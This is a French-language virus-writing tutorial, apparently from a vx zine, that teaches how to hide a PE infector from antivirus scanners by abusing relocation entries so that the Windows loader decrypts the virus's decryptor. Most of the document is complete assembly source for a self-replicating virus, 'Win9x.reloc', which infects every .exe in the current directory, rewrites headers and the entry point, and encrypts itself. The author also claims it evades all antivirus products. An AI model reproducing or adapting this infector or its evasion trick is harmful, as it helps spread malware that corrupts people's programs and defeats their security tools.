@@ -1,0 +1,1006 @@
+------------------------------------------------------------------------------
+                      Total encryption for PE infectors                  Kaze
+------------------------------------------------------------------------------
+
+
+
+
+ [ Introduction ]
+
+
+
+Tres tôt, pour échapper aux scanners, les virus ont adopté une méthode de
+camouflage aujourd'hui très répendue: l'encryption. Cependant, aucun virus
+ne peut s'encrypter totalement, le décrypteur devant toujours être en clair.
+Enfin, ne pouvait ... :p C'est désormais possible, grâce à la magie Windows.
+Imaginez ... votre virus est entièrement crypté sur le disque et c'est
+Windows, au chargement du PE, qui le décrypte à votre place. Sympa non ?
+Cette méthode n'est pas originale, ayant déjà été présentée dans 29A#5 par
+Tcp, mais très brievement, avec peu d'explications et zéro code. De plus, il
+me semble que cette technique n'a jamais été reutilisée dans des virii connus.
+J'ai donc essayé d'y remédier en apportant un exemple fonctionnel et plutot
+efficace (pour l'instant, aucun AV ne l'a détecté, alors qu'il reste très très
+simple).
+Cet article n'est pas un tutoriel sur la programmation de PE infecteurs, il
+assume que vous savez coder ce type d'infecteur et que vous avez quelques
+bases en encryption. Si ce n'est pas le cas, allez lire le tut de rikenar.
+Pour les remarques ou autre, n'hésitez pas:    kaze_0mx@yahoo.fr
+                                               #vxers: irc.epiknet.org
+					       http://www.fat4ever.fr.st
+
+
+
+[ Sommaire ]
+
+  I/   Description
+  II/  Programmation
+  III/ Code source
+  IV/  Conclusion
+
+
+
+
+
+
+  I/   Description
+  ________________
+
+
+Le format PE permet de prendre en charge un mécanisme assez interessant: la
+relocation. Voyez plutôt: lorsqu'un executable (ou un dll) est compilé, le
+linkeur assume que le programme sera chargé à une certaine adresse en RAM.
+Pour windows, cette adresse appelée ImageBase est généralement 0x400000.
+99% du temps cette adresse est disponible dans le process et les relocations
+n'auront pas lieu. C'est pour cela que quelques virus se recopient sur la
+section des relocs, étant tres rarement utilisée.  Mais lorsque par exemple
+un executable et un  dll ayant tous deux une ImageBase de 0x400000  sont
+chargés en RAM, ils ne  peuvent être  chargés tous deux à 0x400000. L'un des
+deux devra donc être  chargé à une adresse différente, ce qui faussera alors
+tout son adressage. C'est le même principe que pour le delta offset:
+
+
+                __________ 0x400000 _________
+   -------------                             -------------
+   | MZ HEADER |                             | MZ HEADER |
+   |-----------|                             |-----------|
+   | PE HEADER |                             | PE HEADER |
+   |-----------|                             |-----------|
+   |           |                             |           |
+   |           |                             |           |
+   |    EXE    |                             |    DLL    |
+   | variable1 |<---  adresse variable1  --->| ........  |---?
+   | variable2 |<---  adresse variable2  --->| ........  |   |  Decalage
+   -------------       _______|________      |-----------|   |
+                       etablies lors de      | MZ HEADER |   |
+                        la compilation       |-----------|   |
+                                             | PE HEADER |   |
+                                             |-----------|   |
+                                             |           |   |
+                                             |           |   |
+                                             |    EXE    |   |
+                                             | variable1 |---Ã
+                                             | variable2 |
+                                             -------------
+
+
+ C'est pour remedier à ce problème que sont apparues les relocs. Elles se
+ caracterisent sous forme d'une section généralement nommée ".reloc" qui
+ est en gros une liste d'adresses pointant vers chaque dword de l'executable
+ qui contient une adresse absolue. Si l'executable est chargé à une adresse
+ differente de son ImageBase, alors le décalage sera appliqué à toutes les
+ adresses absolues de cette executables. Exemple:
+
+
+ Mettons nous dans le cas d'un executable compilé avec une ImageBase de
+ 0x400000, et qui ne peut être chargé qu'à 0x500000. Dans son code, si il
+ y avait un :
+                                ...
+
+        reloc:          mov eax,[0x401009]       ; B8  09 10 40 00
+                                ...              ;= mov eax, offset variable1
+
+
+	variable1 	dd 'VAR1'
+
+
+avec offset variable1 égal à par exemple 0x401009, une relocation serait
+appliquée lors de son chargement sur le dword à l'emplacement reloc+1, en
+ajoutant 0x500000-0x400000 soit 0x100000. Ce qui donnerait finalement en
+memoire:
+
+
+	0x500000:
+	         		...         relocation ( + 0x100000 )
+                                  ____|___
+        reloc:           mov eax,[0x501009]      ; B8  09 10 50 00
+                 		...
+
+        0x501009:            'VAR1'              ; "VAR1"  L'adresse est ok.
+	        		...
+
+
+Ainsi, bien que le code ait été chargé à une adresse non prévue par le
+compilateur, les relocations lui ont permis de fonctionner comme si de rien
+n'était, en ajoutant le décalage nécessaire à chaque adresse de l'executable.
+Et ce qui est intéressant, c'est que ces additions sont effectuées
+automatiquement au chargement de l'executable...
+
+Autre chose d'encore plus interressant est que quand windows rencontre une
+ImageBase à laquelle il ne peut charger l'executable (par exemple < 0x400000)
+ou >0x80000000), Windows le charge automatiquement à l'adresse 0x400000 et
+applique les relocs en conséquence.
+
+Si l'on arrivait à modifier les relocs d'un PE pour qu'elles pointent vers
+chaque dword de notre decrypteur, et si l'on forçait les relocs à s'executer
+en changeant l'ImageBase en disons  NewImageBase, que se passerait-il ? Et
+bien tout d'abord, au chargement de l'executable, à chaque dword de notre
+decrypteur serait ajoutée la valeur ImageBase-NewImageBase  (il faudrait donc
+bien sur l'encrypter avant en otant la valeur ImageBase-NewImageBase), et
+quand notre virus  rendrait le contrôle au PE hôte, il crasherait.  Pourquoi ?
+Parce qu'en faisant pointer les relocs vers notre decrypteur, nous avons
+écrasé les anciennes relocs du PE. Et comme vu precedemment, si il est chargé
+à une adresse différente de son ImageBase sans relocations, son adressage
+devient faux: il crash.
+
+Mais si l'on infectait uniquement les PE ayant une ImageBase de 0x400000 et
+que l'on changeait leur ImageBase en une NewImageBase à laquelle windows ne
+peut pas charger l'executable (par ex. <0x400000), que se passerait-il ?
+Et bien l'executable serait chargé à l'adresse 0x400000 et les relocs seraient
+appliquées, et donc notre decrypteur decrypté. Mais là, le fichier ne
+crasherait pas vu qu'il serait chargé à son ImageBase et que ses relocs ne
+seraient pas appliquées, vu qu'on les a écrasé avec les notres. Voila donc ce
+qu'il nous reste à faire...
+
+
+
+
+
+
+  II/  Programmation
+  __________________
+
+
+Tout d'abord, voyons comment se présentent ces relocations:
+Une section reloc est constituée d'une suite de "RelocChunk", chacun portant
+les informations de relocation pour 4k de code:
+
+[ RELOC_CHUNK ]
+
+        DWORD   RelocBase         ;Base (RVA) à partir de laquelle les relocs
+                                  ;seront appliquées.
+        DWORD   RelocLen          ;Taille du RELOC_CHUNK
+        WORD    Reloc1            ;Une reloc. Voir plus loin ...
+        WORD    Reloc2            ;Une autre reloc. Voir plus loin ...
+            ...
+La fin des relocs est marquée par un RELOC_CHUNK ayant pour Reloc_base le
+dword 0.
+
+Une reloc en elle-même est un word, constitué comme suit:
+Les 4 premiers bits (MSB) représentent le type de reloc à appliquer, à savoir:
+
+RELOC_ABSOLUTE         EQU   0
+Pas de signification, utilisé pour aligner le RELOC_CHUNK sur 32bits.
+
+RELOC_16BITS_HIGH      EQU   1
+La relocation doit être appliquée sur le word de poids fort (MSB) du dword
+en question.
+
+RELOC_16BITS_LOW       EQU   2
+La relocation doit être appliquée sur le word de poids faible (LSB) du dword
+en question.
+
+RELOC_32BITS           EQU   3
+La relocation doit étre appliquée au dword, en entier.
+
+
+Les 12 derniers bits (LSB) eux contiennent le décalage par rapport à RelocBase
+ou la reloc doit être appliquée. D'ou le fait que chaque RELOC_CHUNK ne peut
+adresser plus de 2^12 soit 4096 bytes.
+Par exemple, si vous tombez sur un RELOC_CHUNK de ce type:
+
+      0x00001000                ;RelocBase = 0x1000
+      0x00000010                ;Taille du RELOC_CHUNK = 16 bytes
+      0x3016                    ;reloc
+      0x2020                    ;reloc
+      0x3088                    ;reloc
+      0x0000                    ;reloc
+
+      0x00000000                ;RelocBase du RELOC_CHUNK suivant
+
+On remarque que 3 relocations s'appliquent:
+La premiere à la RVA 0x1000 + 0x0016 soit à 0x1016 sur un dword.
+La deuxième à la RVA 0x1020 sur le mot de poids faible du dword.
+La troisième à la RVA 0x1088, sur un dword.
+La quatrième n'indique rien, servant juste à aligner le RELOC_CHUNK sur
+32bits.
+Le RELOC_CHUNK qui suit termine la liste vu qu'il possède pour RelocBase le
+dword 0.
+
+
+Maintenant que nous avons toutes les informations en main, il ne nous reste
+plus qu'à appliquer le tout. Voila ce qu'il devrait se passer lors de
+l'infection d'un fichier:
+
+
+ 1) Vérifier que son ImageBase est bien 0x400000, sinon exit.
+ 2) Modifier son ImageBase en une NewImageBase à laquelle win ne pourra le
+    charger
+ 3) Soustraire la valeur (ImageBase-NewImageBase) à chaque dword du décrypteur
+ 4) Si il n'y a pas de section .reloc, en creer une
+ 5) Modifier les relocs pour qu'elles pointent vers chaque dword du décrypteur
+ 6) Infecter le fichier
+ 7) exit
+
+
+
+Ainsi, le virus sera entièrement crypté sur le disque, et automatiquement
+décrypté lors de son chargement en RAM. Plutot sympa ... Au lieu de juste
+crypter un décrypteur on pourrait bien sur crypter ainsi tout le virus, mais
+cela necessiterait une section .reloc bien plus importante... La meilleure
+solution à mon goût reste donc d'utiliser une encryption même simple et
+d'encrypter uniquement le decrypteur via cette technique.
+
+
+A partir de maintenant, j'assumerai que votre décrypteur est de la forme:
+
+debut:  call delta
+delta:  pop ebp
+        sub ebp,offset delta                          ;calcul le delta offset
+        lea esi,[ebp+virus]	   ;esi --> code à décrypter
+        mov ecx,virus_len-(offset virus-offset debut) ;taille du virus -
+        mov edi,esi                                   ;taille du decrypteur
+encrypt:
+        lodsb
+        xor al,[ebp+encrypt_val]                      ;simple 8bits xor encrypt°
+        stosb
+        loop encrypt
+        jmp virus
+
+encrypt_val db 0
+
+        crypteur_len equ ($ - offset debut)/4+1       ;nombre de dword du
+                                                      ;decrypteur + 1
+ALIGN DWORD
+virus:                                                ;début du virus ...
+
+
+
+Il peut être différent bien sur, mais il faudrait conserver les constantes
+debut, virus et crypteur_len + le ALIGN DWORD.
+Pour l' étape 1, rien de bien compliqué, il suffit de regarder à l'offset
+34h du PE Header pour obtenir l'ImageBase.
+
+;edx --> PE Header du fichier en train d'être infecté
+
+        cmp dword ptr [edx+34h],0400000h
+        jnz pasbon
+
+
+Pour l'étape 2, il va nous falloir trouver une adresse à laquelle windows
+ne pourra charger l'executable. Les valeurs possibles vont de 0 à
+0x400000 et de 0x80000000 à 0xFFFFFFFF. Le mieux serait d'en obtenir une
+aléatoirement. Pour obtenir un dword aléatoire, chacun sa méthode.
+Moi j'ai choisi de lire le TimeStamp à l'offset 08h du PE Header. Ca nous
+donne un nombre différent pour chaque fichier infecteur, ce qui est
+largement suffisant à mon goût. Si cette valeur est à 0, alors on peut
+prendre comme valeur 0x100000, qui est l'ImageBase des vieilles applis
+windows, comme ca ca ne fera pas trop suspect.
+Tcp nous dit que WinNT n'admet que des ImageBase multiples de 64k, donc
+on arrondira le résulta final sur 64k.
+
+
+;edx --> PE Header du fichier en train d'être infecté
+
+        mov eax,[edx+8]            ; TimeDateStamp  (random...)
+        test eax,eax
+        jz hcrandom                ; Si 0, valeur par défault.
+findrandom:
+        js ncrandom                ; Si >= 0x80000000 c'est bon.
+        cmp eax,400000h
+        jb ncrandom                ; si < 0x400000 c'est bon aussi.
+        ror eax,1                  ; On ror la valeur jusqu'à que ce soit bon.
+        jmp findrandom
+hcrandom:
+        mov eax,0100000h           ; Old windows applications ImageBase
+ncrandom:
+        xor ax,ax                  ; NT/2000 Compatibility ?
+        mov [edx+34h],eax          ; NewImageBase
+
+
+
+Ensuite, il nous faut encrypter notre décrypteur. Rien de bien compliqué là
+encore.
+
+;edi = Offset du virus sur le disque (pas en ram hein).
+
+        mov esi,edi
+        mov ebx,0400000h
+        mov ecx,crypteur_len
+        sub ebx,eax                ; Ebx = ImageBase - NewImageBase
+encryptdécrypteur:
+        lodsd
+        sub eax,ebx                ; Encrypte le decrypteur.
+        stosd
+        loop encryptdécrypteur
+
+
+Voila, c'est l'application bête et méchante de ce qui a été dit plus haut.
+
+
+
+Pour l'étape 4, je ne proposerai pas de code car cela dépend énormément de
+votre virus. Si vous voulez des exemples, allez voir le code source. Juste
+quelques indices: pour savoir si une section de relocs est présente, il suffit
+de regarder à l'offset 0xA0 du PE Header. Vous trouverez la RVA des
+relocations. Si elle est égale à 0, alors il n'y a pas de relocs et il vous
+faudra alors creer une nouvelle section pour les y mettre. J'ai déjà essayé de
+mettre les relocs dans la même section que le virus, mais pour des raisons
+obscures que j'aimerais bien connaitre, ca n'a jamais fonctionné. L'unique
+solution que j'ai trouvé a été de creer une nouvelle section.
+Nommez cette section ".reloc", avec pour flags 0x50000040. Pour VirtualAddress
+et RawAddress, à vous de voir. Pour VirtualSize, c'est simple, c'est:
+
+        Relocs.VirtualSize = (crypteur_len*2) + 8.
+
+*2 car une reloc fait deux bytes et + 8 pour le header du RELOC_CHUNK. Pour la
+RawSize, il suffit juste d'arrondir la VirtualSize sur le FileAlignement
+
+
+
+Maintenant que nous sommes surs qu'une section .reloc existe, qu'elle soit
+déjà là ou qu'elle ait été crée par notre virus, il ne nous reste plus qu'à la
+remplir pour que notre décrypteur soit décrypté au chargement du PE infecté.
+Il nous faut localiser la section  contenant les relocs et récupérer son
+RawOffset (adresse sur le disque), puis y écrire un RELOC_CHUNK qui appliquera
+des RELOC_32BITS sur chaque dword de notre decrypteur. Pour localiser la
+section des relocs (section crée ou déjà présente), la solution la plus sure/
+simple consiste à regarder à l'offset 0xA0 du PE Header ou se trouve la RVA
+des relocs. Il suffit ensuite de parcourir chaque section header et celui qui
+possède comme VirtualAddress cette RVA est le header de la section des relocs.
+On regarde son RawOffset et c'est gagné.
+
+
+
+;edx --> PE Header du fichier en train d'être infecté.
+;esi = VirusRVA (RVA du virus dans le PE infecté, souvent égal à SizeOfImage).
+;edi = Adresse ou est mappé le fichier (grace a MapViewOfFile)
+
+ push edi
+ mov eax,[edx+0A0h]              ;Relocs RVA.
+ lea edi,[edx+18h]               ;edi --> OptionalHeader.
+ movzx ecx,word ptr[edx+14h]     ;SizeOfOptionalHeader.
+ add edi,ecx                     ;edi --> sections headers.
+ movzx ecx,word ptr [edx+6]      ;ecx=nombre de sections
+ imul ecx,ecx,28h/4              ;Un header de section = 28h bytes.
+ repnz scasd                     ;Cherche dans les sections celle qui a pour
+ jnz erreur                      ;VirtualAdress RelocRVA
+                                 ;(section .reloc deja là ou prealablement crée)
+ mov ebx,[edi+4]                 ;RawOffset (VirtualAddress+8)
+ pop edi
+ add ebx,edi                     ;edi--> Fichier mappé grâce à MapViewOfFile.
+                                 ;ebx--> Relocs (sur le disque toujours hein).
+ mov [ebx],esi                           ;esi = VirusRVA = RelocBase.
+ mov [ebx+4],dword ptr crypteur_len*2+8  ;taille des relocs (meme un peu +)
+ mov ecx,crypteur_len                    ;nombre de relocs a effectuer
+ xor eax,eax                     ;1ere reloc a l'offset (relatif a RelocBase) 0
+ add ebx,8                       ;on commence ...
+ or ax,3000h                     ;type de reloc: RELOC_32bits
+
+relloop:
+ mov [ebx],ax                    ;écrit une reloc
+ add ax,4                        ;un dword plus loin: prochaine reloc à
+                                 ;effectuer
+ add ebx,2                       ;1 reloc = 1 word
+ loop relloop
+ and [ebx],dword ptr 0           ;marque la fin des relocs en mettant là
+relocsdone:                      ;RelocBase du prochain RELOC_CHUNK à 0
+
+
+
+
+
+
+  III/ Code Source
+  ________________
+
+
+;----------------------------------------------------------------------------;
+;FICHIER : Reloc.asm                                                         ;
+;NOM     : Win9x.reloc                                                       ;
+;DATE    : 12/01/2003                                                        ;
+;VERSION : 0.4                                                               ;
+;AUTEUR  : kaze <kaze_0mx@yahoo.fr>                                          ;
+;CIBLE   : PE                                                                ;
+;OS      : Windows 95/98                                                     ;
+;STEALTH : 32bits xor encryption + 32bits add/sub via relocs encryption      ;
+;INFECT  : Ajout de sections                                                 ;
+;TAILLE  : 1409 bytes                                                        ;
+;PAYLOAD : MessageBoxA                                                       ;
+;DESC    : Ce virus est une simple application de ce tut et en rien un       ;
+;          exemple. Il a été simplifié au possible dans ce but. N'infecte que;
+;          les PE du rep courant, enfin, normalement :p                      ;
+;COMP    : tasm32 /ml /l /m3 reloc                                           ;
+;          tlink32 /Tpe /aa  reloc,,,import32.lib                            ;
+;          makeex reloc.exe (rend la section .code executable)               ;
+;----------------------------------------------------------------------------;
+
+.386p
+.model flat,STDCALL
+extrn MessageBoxA:PROC
+extrn ExitProcess:PROC
+
+call_ macro x
+        call [ebp+x]
+endm
+
+.data
+db 'Win9x.reloc coded by kaze/FAT'
+
+.code
+debut:                          ;Entry Point
+
+;================================= (DE)CRYPTEUR ==============================
+
+        call delta
+delta:  pop ebp
+        sub ebp,offset delta
+        lea esi,[ebp+gogogo]
+        mov ecx,(virus_len - (offset gogogo-offset debut))/4+1
+        push esi
+        mov edi,esi
+
+encrypteur proc near
+encrypt:
+        lodsd
+        xor eax,[ebp+encrypt_val]
+        stosd
+        loop encrypt
+        ret
+encrypt_val dd 0
+encrypteur endp
+        crypteur_len equ ($ - offset debut)/4+1
+ALIGN DWORD
+
+;====================== RECHERCHE DE L'ADRESSE DE K32 =========================
+
+gogogo:
+        mov ebx,[esp]
+        and ebx,0FFFF0000h
+scan_mem:
+        cmp [ebx],word ptr 'ZM' ; est-on au debut d'un MZ header ?
+        jz valide_pe            ; on y est
+rescan_mem:
+        sub ebx,10000h          ; prochain alignement de 64k (page)
+        jmp scan_mem
+
+valide_pe:                      ; ebx pointe vers le MZ header
+        mov ecx,[ebx+3ch]       ; ecx=taille du MZ header
+        add ecx,ebx             ; ecx pointe vers le PE header
+        cmp ecx,dword ptr [esp] ; est-ce une adresse coherente ?
+        ja rescan_mem           ; non, on y retourne
+        cmp word ptr [ecx],'EP' ; c'est bien le PE header ?
+        jnz rescan_mem          ; non, on y retourne
+
+        push [ebp+AncienEP]
+
+;================= RECHERCHE DE L'ADRESSE DE GetProcAddress ==================
+
+                                ; ebx=base de kernel32
+        mov esi,[ecx+78h]       ; export
+        add esi,ebx
+        mov edi,[esi+12]
+        add edi,ebx
+        cmp dword ptr [edi],'NREK'      ;c'est bien les infos pour kernel32?
+        jnz erreur                      ;non
+
+        add esi,1ch             ; esi--> adresse des fonctions
+        lea edi,[ebp+adrfonc]
+        mov ecx,3
+
+getinfo:
+        lodsd
+        add eax,ebx             ; RVA2offset
+        stosd
+        loop getinfo
+
+        mov esi,[ebp+adrname]   ; esi-->table des offsets des noms
+newfnc: lodsd                   ; donne l'adresse d'un nom
+        add eax,ebx             ; RVA2offset
+        mov edi,eax
+        push esi
+        lea esi,[ebp+api1]
+        mov ecx,15
+        repz cmpsb
+        jz yaowyaow
+        pop esi
+        jmp newfnc
+
+yaowyaow:
+        pop eax
+        xor esi,esi
+        sub eax,4               ; lodsd oblige
+        sub eax,[ebp+adrname]   ; c'est maintenant une rva
+        shr eax,1               ; eax=index *2
+        add eax,[ebp+adrord]
+        mov si,[eax]
+        shl esi,2
+        add esi,[ebp+adrfonc]
+        lodsd
+        add eax,ebx             ; eax=adresse de GetProcAddress
+        mov [ebp+GetProcAddress],eax
+        mov ecx,nbrapis
+
+
+        call ChercheApis        ; cherche les autres apis maintenant
+        call InfectRep          ; Infecte le rep courant
+        test ebp,ebp            ; premiere generation ?
+        jz hostcode
+
+;================================= PAYLOAD ====================================
+
+        xor eax,eax
+        lea edx,[ebp+nomsection]
+        lea ebx,[ebp+message]
+        push eax
+        push edx
+        push ebx
+        push eax
+        call_ MessageBox
+
+        pop eax                 ; eax = Ancien EntryPoint
+        add eax,400000h         ; N'infecte que les PE avec ImageBase=0x400000
+        jmp eax
+
+erreur: jmp erreur
+
+nbrapis equ 10
+api1 db 'GetProcAddress',0
+api2 db 'GetModuleHandleA',0
+api4 db 'FindFirstFileA',0
+api8 db 'FindClose',0
+api9 db 'CloseHandle',0
+apiA db 'CreateFileA',0
+apiB db 'SetFileAttributesA',0
+apiC db 'FindNextFileA',0
+apiD db 'MapViewOfFile',0
+apiE db 'CreateFileMappingA',0
+apiF db 'UnmapViewOfFile',0
+mask db '*.exe',0
+nomsection db 'kaze/FAT',0
+message db 'Infection reussie',0
+user32 db 'User32.dll',0
+nMessageBoxA db 'MessageBoxA',0
+AncienEP dd 0
+
+;================================= FONCTIONS =================================
+
+InfectPE proc near              ; eax-->fichier
+        push eax
+        mov edx,[eax+3Ch]
+        add edx,eax             ; edx-->PEHeader
+        xor ecx,ecx
+
+        lea esi,[edx+18h]
+        mov cx,[edx+14h]        ; SizeOfOptionalHeader
+        add esi,ecx             ; esi-->sections
+        mov [ebp+sectionaddr],esi
+        mov bx,word ptr [edx+6]
+        mov eax,28h
+        inc word ptr [edx+6]
+        cmp [ebp+nbrsections],24
+        jnz une_seule_section_a_rajouter
+        inc word ptr [edx+6]
+une_seule_section_a_rajouter:
+        push edx
+        mul bx
+        pop edx
+        add esi,eax
+        xor eax,eax
+        mov ecx,[ebp+nbrsections] ; soit 28h/4, soit (28h/4)*2 si section
+                                  ; '.reloc' en +
+        mov edi,esi
+        repz scasd              ; y'a-t-il de la place ?
+        jnz byebye              ; non
+        mov ebx,esi
+        mov edi,esi
+        lea esi,[ebp+nomsection]
+        movsd                   ; Recopie 'kaze/FAT'
+        movsd
+        mov [edi],dword ptr virus_len + Heap_len+100h   ; VirtualSize
+        mov esi,[edx+50h]       ; SizeOfImage
+        mov [edi+4],esi         ; VirtualAdress = SizeOfImage
+        mov ecx,[edx+3ch]       ; File alignement
+        push edx                ; Aligne la taille du virus sur
+        xor edx,edx             ; le file_alignement
+        mov eax,virus_len
+        mov ebx,eax
+        div ecx
+        sub ecx,edx
+        add ebx,ecx
+        pop edx
+        mov [edi+8],ebx         ; file size
+        mov eax,[ebp+WFD_nFileSizeLow]
+        mov [edi+12],eax        ; file offset
+        mov [edi+1Ch],0F0000060h
+
+        cmp dword ptr [ebp+nbrsections],12  ; Faut-il rajouter aussi une .reloc?
+        jz yarelocs2                        ; Non, y'en a deja une.
+        mov [edi+20h],'ler.'
+        mov [edi+24h],'  co'
+        mov [edi+28h],dword ptr crypteur_len+10
+        mov eax,esi                     ; Esi = SizeOfImage = VirusRVA
+        add eax,1000h                   ; Rajoute 1000h (virus< 1000h)
+        mov [edi+2Ch],eax               ; VirtualAddress
+        mov [edx+0A0h],eax              ; RelocRVA = VirtualAddress de .reloc
+        mov eax,[ebp+tailleajustee]
+        mov ecx,[ebp+alignement]
+        mov [edi+30h],ecx               ; RawSize (pas beaoucoup de relocs,
+                                        ; un alignement suffit)
+        sub eax,ecx
+        mov [edi+34h],eax               ; RawOffset=Tailledufichier - 1
+                                        ; alignement (largement suffisant)
+        mov [edi+44h],050000060h        ; Flags
+yarelocs2:
+        mov ecx,[edx+50h]               ; Ecx = SizeOfIMage = VirusRVA
+        xchg [edx+28h],ecx              ; PEHeader:28h = EntryPoint
+        mov [ebp+AncienEP],ecx
+;preparation des relocs
+        mov eax,[edx+78h+40]            ; Reloc RVA
+        xor ecx,ecx
+        mov edi,[ebp+sectionaddr]       ; Cherche dans les sections celle qui
+        mov cx,word ptr [edx+6]         ; a pour VirtualAdress RelocRVA
+        imul ecx,ecx,28h/4              ; ( section deja là ou
+        repnz scasd                     ; préalablement crée )
+        jnz erreur
+        mov ebx,[edi+4]                 ; RawOffset (VirtualAddress + 8)
+        pop edi                         ; MapOffset
+        add ebx,edi
+        mov [ebx],esi                           ; Esi=SizeOfImage= RelocBase
+        mov [ebx+4],dword ptr crypteur_len*2+8  ; Taille des relocs
+        mov ecx,crypteur_len                    ; Nombre de relocs a effectuer
+        xor eax,eax                     ; Premiere reloc a l'offset
+                                        ; (relatif a RelocBase) 0
+        add ebx,8                       ; RELOC_CHUNK + 8 ...
+        or ax,3000h                     ; Type de reloc: 32bits
+relloop:
+        mov [ebx],ax
+        add ax,4                        ; Un dword plus loin: prochaine
+                                        ; reloc.
+        add ebx,2                       ; 1 reloc = 1 word.
+        loop relloop
+        and [ebx],dword ptr 0           ; Marque la fin des relocs.
+        mov eax,[ebp+encrypt_val]       ; Change la clé de cryptage
+relocsdone:
+        add eax,07050301h
+        ror eax,3
+        test eax,eax                     ; Si clé=0 alors pas de cryptage :/
+        jz relocsdone
+        mov [ebp+encrypt_val],eax
+        mov [edx+78h+40+4],dword ptr crypteur_len*2+8+4  ;RelocSize
+        add edi,[ebp+WFD_nFileSizeLow]         ; Pointe vers la fin du fichier
+        push edi
+        lea esi,[ebp+debut]
+        mov ecx,virus_len
+        add [edx+50h],dword ptr 2000h    ; Virus_len+Heap_len
+        rep movsb                        ; Recopie le virus ....
+        pop edi
+        mov esi,edi
+        mov eax,[edx+8]            ;TimeDateStamp  (random...)
+findrandom:                        ; Là on choisit une ImageBase aléatoire
+        test eax,eax               ; à laquelle win ne pourra charger l'exe
+        jz hcrandom                ; là on choisit une valeur par défault.
+        js ncrandom                ; si > 0x80000000 c'est bon.
+        cmp eax,400000h
+        jb ncrandom                ; si < 0x400000 c'est bon aussi.
+        ror eax,1
+        jmp findrandom
+hcrandom:
+        mov eax,0100000h           ; Old windows applications ImageBase
+ncrandom:
+        xor ax,ax                  ; NT/2000 Compatibility
+        mov [edx+34h],eax          ; ImageBase
+        mov edx,edi
+        mov ebx,0400000h
+        sub ebx,eax                ; Ebx = ImageBase - NewImageBase
+        mov ecx,crypteur_len
+encrelocs:
+        lodsd
+        sub eax,ebx                ; Encrypte le decrypteur.
+        stosd
+        loop encrelocs
+        mov edi,edx
+        add edi,(offset gogogo-offset debut)
+        mov ecx,(virus_len - (offset gogogo-offset debut))/4+1
+        mov esi,edi                          ; Esi=edi --> virus mappé dans le
+                                             ; fichier.
+        call encrypteur                      ; Encrypte tout le virus
+                                             ; sauf le décrypteur
+byebye:
+        ret
+InfectPE endp
+
+InfectRep proc near
+        lea esi,[ebp+WFD]
+        lea eax,[ebp+mask]
+        push esi
+        push eax
+        call_ FindFirstFile
+        inc eax
+        jz badrep
+        dec eax
+        mov [ebp+Shandle],eax
+unautreverre?:
+        lea esi,[ebp+WFD_szFileName]
+        call Infection
+        lea eax,[ebp+WFD]
+        push eax
+        push [ebp+Shandle]
+        call_ FindNextFile
+        test eax,eax                    ; Dernier fichier ?
+        jnz unautreverre?
+        push [ebp+Shandle]
+        call_ FindClose
+badrep: ret
+InfectRep endp
+
+Infection proc near                     ; Esi--> WFD_szFileName
+        push ecx
+        push 80h
+        push esi
+        call_ SFA
+        xor eax,eax
+        push eax
+        push eax
+        push 3
+        push eax
+        inc eax
+        push eax
+        push 0C0000000h
+        push esi
+        call_ CreateFile
+        inc eax
+        jz peuxpas
+        dec eax
+        mov [ebp+Fhandle],eax
+
+        mov edi,[ebp+WFD_nFileSizeLow]
+        call CreateMappedFile
+        test eax,eax
+        jz mappas
+        mov [ebp+Mhandle],eax
+        call MapFile
+        test eax,eax
+        jz veuxpas
+        mov [ebp+MapOff],eax
+        mov dword ptr [ebp+nbrsections],12
+        mov esi,[eax+3Ch]
+        cmp esi,edi
+        jae pasbon                        ; Si MZ, evite une violation de page
+        add esi,eax
+        cmp dword ptr [esi],'EP'
+        jnz pasbon
+        cmp dword ptr [esi+34h],0400000h
+        jnz pasbon
+        xor ecx,ecx
+        cmp dword ptr [esi+78h+40],0      ; Reloc RVA
+        mov esi,[esi+3Ch]                 ; File Alignement
+        mov [ebp+alignement],esi
+        jnz yarelocs
+        add dword ptr [ebp+nbrsections],12; Si y'a pas de relocs, alors 2
+                                          ; sections a rajouter
+        mov ecx,esi
+yarelocs:
+        push ecx
+        push [ebp+MapOff]
+        call_ UMVOFile
+        push [ebp+Mhandle]
+        call_ CloseHandle
+        xor edx,edx
+        add edi,virus_len                 ; Edi = fichier + virus
+        mov eax,edi
+        div esi
+        sub esi,edx
+        add edi,esi                       ; Edi = tailletotale + ( alignement-
+                                          ; tailletotale%Alignement)
+        pop ecx
+        add edi,ecx                       ; Ajoute ou non l'espace pour les
+                                          ; relocs (espace = 1 alignement)
+        mov [ebp+tailleajustee],edi       ; Sauve la taille finale du fichier
+        call CreateMappedFile
+        mov [ebp+Mhandle],eax
+        call MapFile
+        mov [ebp+MapOff],eax
+        call InfectPE                     ; On l'infecte
+
+pasbon: push [ebp+MapOff]
+        call_ UMVOFile
+veuxpas:push [ebp+Mhandle]
+        call_ CloseHandle
+mappas: push [ebp+Fhandle]
+        call_ CloseHandle
+peuxpas:push [ebp+WFD_dwFileAttributes]
+        lea eax,[ebp+WFD_szFileName]
+        push eax
+        call_ SFA
+        pop ecx
+        ret
+Infection endp
+
+ChercheApis proc near
+        lea esi,[ebp+api2]
+        lea edi,[ebp+GetModuleHandle]
+chapis: push ecx
+        push esi
+        push ebx
+        call_ GetProcAddress
+        pop ecx
+        test eax,eax
+        jz erreur
+        stosd
+yy:     lodsb
+        test al,al
+        jnz yy
+        loop chapis
+        lea eax,[ebp+user32]
+        push eax
+        call_ GetModuleHandle
+        test eax,eax
+        jz erreur
+        lea edx,[ebp+nMessageBoxA]
+        push edx
+        push eax
+        call_ GetProcAddress
+        mov [ebp+MessageBox],eax
+        ret
+ChercheApis endp
+
+MapFile         proc            ;edi=taille
+        xor     eax,eax
+        push    edi
+        push    eax
+        push    eax
+        push    00000002h
+        push    [ebp+Mhandle]
+        call_    MVOFile
+        ret
+MapFile         endp
+
+CreateMappedFile proc near      ;edi=taille
+        xor eax,eax
+        push eax
+        push edi
+        push eax
+        push 00000004h
+        push eax
+        push [ebp+Fhandle]
+        call_ CreateFileMapping
+        ret
+CreateMappedFile endp
+dd 0
+endvirus equ $
+virus_len equ $-offset debut
+
+;================================= HEAP START ================================
+
+alignement              dd ?
+tailleajustee           dd ?
+sectionaddr             dd ?
+adrfonc                 dd ?
+adrname                 dd ?
+adrord                  dd ?
+nbrsections             dd ?
+
+GetProcAddress          dd ?
+GetModuleHandle         dd ?
+FindFirstFile           dd ?
+FindClose               dd ?
+CloseHandle             dd ?
+CreateFile              dd ?
+SFA                     dd ?
+FindNextFile            dd ?
+MVOFile                 dd ?
+CreateFileMapping       dd ?
+UMVOFile                dd ?
+Beep                    dd ?
+MessageBox              dd ?
+
+Shandle                 dd ?
+Fhandle                 dd ?
+Mhandle                 dd ?
+MapOff                  dd ?
